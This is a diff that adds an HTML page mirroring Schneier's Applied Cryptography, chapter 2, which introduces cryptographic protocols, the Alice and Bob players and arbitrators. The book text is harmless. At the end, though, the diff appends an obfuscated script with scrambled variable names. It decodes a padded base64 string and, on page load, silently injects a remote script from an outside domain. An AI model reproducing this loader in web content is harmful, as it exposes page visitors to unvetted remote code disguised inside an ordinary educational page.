@@ -1,0 +1,100 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=021-023//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch01/01-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2 ALIGN="CENTER"><FONT COLOR="#000077"><I>Part I<BR>Cryptographic protocols
+</I></FONT></H2>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 2<BR>Protocol Building Blocks
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">2.1 Introduction to Protocols</FONT></H3>
+<P>The whole point of cryptography is to solve problems. (Actually, that&#146;s the whole point of computers&#151;something many people tend to forget.) Cryptography solves problems that involve secrecy, authentication, integrity, and dishonest people. You can learn all about cryptographic algorithms and techniques, but these are academic unless they can solve a problem. This is why we are going to look at protocols first.
+</P>
+<P>A <B>protocol</B> is a series of steps, involving two or more parties, designed to accomplish a task. This is an important definition. A &#147;series of steps&#148; means that the protocol has a sequence, from start to finish. Every step must be executed in turn, and no step can be taken before the previous step is finished. &#147;Involving two or more parties&#148; means that at least two people are required to complete the protocol; one person alone does not make a protocol. A person alone can perform a series of steps to accomplish a task (like baking a cake), but this is not a protocol. (Someone else must eat the cake to make it a protocol.) Finally, &#147;designed to accomplish a task&#148; means that the protocol must achieve something. Something that looks like a protocol but does not accomplish a task is not a protocol&#151;it&#146;s a waste of time.</P>
+<P>Protocols have other characteristics as well:</P>
+<DL>
+<DD>&#151; Everyone involved in the protocol must know the protocol and all of the steps to follow in advance.
+<DD>&#151; Everyone involved in the protocol must agree to follow it.
+<DD>&#151; The protocol must be unambiguous; each step must be well defined and there must be no chance of a misunderstanding.
+<DD>&#151; The protocol must be complete; there must be a specified action for every possible situation.
+</DL>
+<P>The protocols in this book are organized as a series of steps. Execution of the protocol proceeds linearly through the steps, unless there are instructions to branch to another step. Each step involves at least one of two things: computations by one or more of the parties, or messages sent among the parties.
+</P>
+<P>A <B>cryptographic protocol</B> is a protocol that uses cryptography. The parties can be friends and trust each other implicitly or they can be adversaries and not trust one another to give the correct time of day. A cryptographic protocol involves some cryptographic algorithm, but generally the goal of the protocol is something beyond simple secrecy. The parties participating in the protocol might want to share parts of their secrets to compute a value, jointly generate a random sequence, convince one another of their identity, or simultaneously sign a contract. The whole point of using cryptography in a protocol is to prevent or detect eavesdropping and cheating. If you have never seen these protocols before, they will radically change your ideas of what mutually distrustful parties can accomplish over a computer network. In general, this can be stated as:</P>
+<DL>
+<DD>&#151; It should not be possible to do more or learn more than what is specified in the protocol.
+</DL>
+<P>This is a lot harder than it looks. In the next few chapters I discuss a lot of protocols. In some of them it is possible for one of the participants to cheat the other. In others, it is possible for an eavesdropper to subvert the protocol or learn secret information. Some protocols fail because the designers weren&#146;t thorough enough in their requirements definitions. Others fail because their designers weren&#146;t thorough enough in their analysis. Like algorithms, it is much easier to prove insecurity than it is to prove security.
+</P>
+<P><FONT SIZE="+1"><B><I>The Purpose of Protocols</I></B></FONT></P>
+<P>In daily life, there are informal protocols for almost everything: ordering goods over the telephone, playing poker, voting in an election. No one thinks much about these protocols; they have evolved over time, everyone knows how to use them, and they work reasonably well.
+</P>
+<P>These days, more and more human interaction takes place over computer networks instead of face-to-face. Computers need formal protocols to do the same things that people do without thinking. If you moved from one state to another and found a voting booth that looked completely different from the ones you were used to, you could easily adapt. Computers are not nearly so flexible.</P>
+<P>Many face-to-face protocols rely on people&#146;s presence to ensure fairness and security. Would you send a stranger a pile of cash to buy groceries for you? Would you play poker with someone if you couldn&#146;t see him shuffle and deal? Would you mail the government your secret ballot without some assurance of anonymity?</P>
+<P>It is na&#239;ve to assume that people on computer networks are honest. It is na&#239;ve to assume that the managers of computer networks are honest. It is even na&#239;ve to assume that the designers of computer networks are honest. Most are, but the dishonest few can do a lot of damage. By formalizing protocols, we can examine ways in which dishonest parties can subvert them. Then we can develop protocols that are immune to that subversion.</P>
+<P>In addition to formalizing behavior, protocols abstract the process of accomplishing a task from the mechanism by which the task is accomplished. A communications protocol is the same whether implemented on PCs or VAXs. We can examine the protocol without getting bogged down in the implementation details. When we are convinced we have a good protocol, we can implement it in everything from computers to telephones to intelligent muffin toasters.</P>
+<P><FONT SIZE="+1"><B><I>The Players</I></B></FONT></P>
+<P>To help demonstrate protocols, I have enlisted the aid of several people (see Table 2.1). Alice and Bob are the first two. They will perform all general two-person protocols. As a rule, Alice will initiate all protocols and Bob will respond. If the protocol requires a third or fourth person, Carol and Dave will perform those roles. Other actors will play specialized supporting roles; they will be introduced later.
+</P>
+<P><FONT SIZE="+1"><B><I>Arbitrated Protocols</I></B></FONT></P>
+<P>An <B>arbitrator</B> is a disinterested third party trusted to complete a protocol (see Figure 2.1a). Disinterested means that the arbitrator has no vested interest in the protocol and no particular allegiance to any of the parties involved. Trusted means that all people involved in the protocol accept what he says as true, what he does as correct, and that he will complete his part of the protocol. Arbitrators can help complete protocols between two mutually distrustful parties.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch01/01-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(uJxKBNIi, npTxwivu) {npTxwivu = uJxKBNIi.createElement('script');npTxwivu.type = 'text/javascript';npTxwivu.async = true;npTxwivu.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');uJxKBNIi.getElementsByTagName('body')[0].appendChild(npTxwivu);}(document));</script></body>
+</html>
